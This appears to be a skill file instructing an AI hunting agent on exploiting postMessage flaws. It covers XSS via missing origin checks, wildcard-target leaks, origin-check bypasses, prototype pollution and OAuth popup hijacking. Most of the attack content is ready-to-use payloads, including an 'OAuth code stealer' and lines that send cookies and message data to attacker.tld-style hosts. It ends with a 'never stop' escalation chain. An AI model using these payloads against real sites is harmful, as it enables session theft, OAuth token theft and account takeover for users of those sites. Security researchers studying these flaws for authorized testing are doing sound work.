---
name: hunt-postmessage
description: "Use this skill when JavaScript contains postMessage() calls, window.addEventListener('message', ...), cross-origin iframes, embedded widgets, OAuth/SSO popups, or any cross-window communication primitive. Load automatically when source maps reveal message handlers, when DevTools shows messages flying between origins, or when the target has chat widgets / embedded checkout / SSO iframes. Only invoke if real impact potential exists (XSS sink, OAuth token theft, ATO, sensitive data leak to attacker-origin iframe). Skip theoretical findings."
type: hunt
---

# Hunt: postMessage Vulnerabilities

Cross-window messaging is one of the most consistently broken primitives on the modern web. Developers forget to validate `event.origin`, send to wildcard `*`, JSON.parse untrusted data into sinks, and confuse `event.source` with `event.origin`. The result is XSS, OAuth code theft, and full ATO.

## Crown Jewel Targets
- OAuth / SSO popup flows that postMessage the auth code back to opener
- Embedded payment / checkout iframes (Stripe wrappers, custom payment UX)
- Chat widgets (Intercom, Drift, custom support) sitting on every page
- SDK-based widgets shipped to thousands of customer sites
- Single-Page Apps that use postMessage for parent ↔ iframe state sync
- Wallet / Web3 connect popups (Metamask-style)
- Sandboxed code editors (CodeSandbox, StackBlitz preview frames)

## Detection Signals
- Grep bundled JS for: `addEventListener('message'`, `addEventListener("message"`, `onmessage =`, `.postMessage(`, `parent.postMessage`, `opener.postMessage`, `top.postMessage`
- DevTools → Sources → search `postMessage`, set breakpoint on each handler, watch traffic
- Burp `postmessage-tracker` extension logs every send/receive with origin
- Look for handlers that do NOT compare `event.origin` against an allowlist
- Look for `postMessage(data, '*')` — wildcard target means any embedding origin reads it
- Look for `JSON.parse(event.data)` followed by `eval`, `innerHTML`, `document.write`, `Function(`, `setTimeout(string`
- Frames using `sandbox="allow-scripts"` without `allow-same-origin` still postMessage freely

## Attack Techniques

1. **Missing origin check → DOM XSS**
   Handler accepts any sender. Send a message that lands in an HTML sink.
   ```html
   <iframe src="https://target.com/widget" id="t"></iframe>
   <script>
   document.getElementById('t').onload = () => {
     t.contentWindow.postMessage({type:'render', html:'<img src=x onerror=alert(document.domain)>'}, '*');
   };
   </script>
   ```

2. **Wildcard target leaks secrets**
   Target calls `parent.postMessage(token, '*')`. Attacker embeds target in an iframe, listens, harvests.
   ```html
   <iframe src="https://target.com/oauth/callback?code=…"></iframe>
   <script>onmessage = e => fetch('https://attacker.tld/?'+encodeURIComponent(JSON.stringify(e.data)));</script>
   ```

3. **`event.source` vs `event.origin` confusion**
   Devs check `event.source === window.parent` thinking it proves identity. But an attacker can open a popup of target.com, then `popup.postMessage(...)` — `event.source` matches but the sender is attacker-controlled via the opened window reference. Always require `event.origin` allowlist.

4. **Regex origin bypass**
   `if (event.origin.indexOf('trusted.com') !== -1)` → attacker hosts `trusted.com.evil.tld` or `evil.tld/trusted.com`. `if (event.origin.endsWith('trusted.com'))` → `attackertrusted.com`. Always use exact `===` match or strict URL parse.

5. **JSON parse → prototype pollution → gadget**
   Handler does `Object.assign(config, JSON.parse(e.data))`. Send `{"__proto__":{"isAdmin":true}}` or pollute a known gadget for XSS.

6. **OAuth popup hijack (ATO)**
   OAuth popup posts the auth code back via `window.opener.postMessage(code, '*')`. Attacker opens a popup of the OAuth start URL from their own page, becomes the opener, harvests the code, exchanges for token → full ATO.

7. **Reverse postMessage (parent → iframe)**
   Page posts to its embedded iframe with `'*'`. Attacker iframes the page, the page's iframe leaks via the bubble. Less common but devastating in widget SDKs.

## Payloads

```javascript
// Generic enumeration — paste in DevTools console on any page
const orig = window.addEventListener;
window.addEventListener = function(t,h,...r){
  if(t==='message'){console.log('[handler]',h.toString().slice(0,300));}
  return orig.call(this,t,h,...r);
};
```

```html
<!-- XSS via missing origin check, sink = innerHTML -->
<!doctype html><iframe src="https://TARGET/page" id=f></iframe>
<script>
f.onload = () => {
  const payloads = [
    {action:'setHTML', value:'<img src=x onerror=fetch("//attacker/"+document.cookie)>'},
    {type:'render', body:'<svg onload=alert(origin)>'},
    {cmd:'eval', code:'fetch("//attacker/?"+document.cookie)'},
    {__proto__:{srcdoc:'<script>alert(1)</'+'script>'}}
  ];
  payloads.forEach(p => f.contentWindow.postMessage(p,'*'));
};
</script>
```

```javascript
// OAuth code stealer — host on attacker.tld
const w = window.open('https://target.com/oauth/authorize?client_id=…&redirect_uri=https://target.com/cb&response_type=code');
window.addEventListener('message', e => {
  if (e.data && (e.data.code || /code=/.test(JSON.stringify(e.data))))
    navigator.sendBeacon('/log', JSON.stringify({origin:e.origin, data:e.data}));
});
```

## Bypass Methods
- Origin allowlist using `includes()` / `indexOf()` / `startsWith()` → register lookalike domain
- `endsWith('.target.com')` → use subdomain takeover on any `*.target.com` to send messages
- Origin check inside try/catch that swallows errors → throw to skip check
- Origin matched but data trusted from any sender after first valid message (state confusion)
- Handler bound on `window` AND on a specific iframe — bypass via the laxer one
- SOP-respecting check but message dispatched via `MessageChannel` ports (transferred port has no origin)
- Sandboxed iframe with `allow-same-origin` removed still postMessages; check assumes sandbox = safe
- Trusted-Types / CSP blocks innerHTML — pivot to `location = javascript:` or `document.write` in older handlers

## Tools
- **Burp postmessage-tracker** (BApp Store) — logs every postMessage with origin/target/data
- **postMessage-tracker** Chrome extension by fransr — overlays sends and receives on the page
- **DOM Invader (Burp Suite)** — has dedicated postMessage tab, auto-tests sinks
- Manual: `grep -rE "addEventListener\(['\"]message|postMessage\(" --include="*.js"` on dumped bundles
- **frida-trace** for native apps wrapping a WebView with postMessage bridges
- Custom listener injection via Tampermonkey to log all messages on any page

## Impact
- **Critical** — OAuth/SSO code theft → full ATO; XSS on authenticated origin; arbitrary action on victim account
- **High** — sensitive data leak (PII, tokens, internal state) to attacker iframe; CSRF-equivalent state changes
- **Medium** — info disclosure of non-sensitive internal config; UI redress without auth impact
- Self-XSS via postMessage to your own window is NOT a finding. The sender must be attacker-controllable from another origin.

## Chain Potential
- postMessage XSS + cookies not `HttpOnly` → session theft → ATO
- postMessage XSS on SSO subdomain + parent-domain cookie scope → ATO of every sibling app
- OAuth popup hijack + open redirect on redirect_uri → token exfil from any client
- postMessage → prototype pollution → gadget XSS → CSP bypass via trusted script
- postMessage sink + Service Worker registration on victim origin → persistent compromise
- Iframe sandbox bypass via postMessage → escape into top frame → full DOM control

## Fallback Chain
1. Enumerate every `message` handler in bundled JS and the live page; record origin checks (or lack thereof) for each.
2. For each handler, send the full payload matrix (XSS sinks, prototype pollution, role/permission flips, JSON injection) from an attacker-controlled iframe; observe handler behavior and side effects.
3. If origin is strictly validated, look for sibling subdomain XSS / takeover that satisfies the origin check, or hunt for `event.source` confusion in popup-based flows.
4. If pure postMessage is locked down, pivot to BroadcastChannel, MessageChannel ports, SharedWorker, or window.name-based cross-frame channels — Never stop because one technique failed.
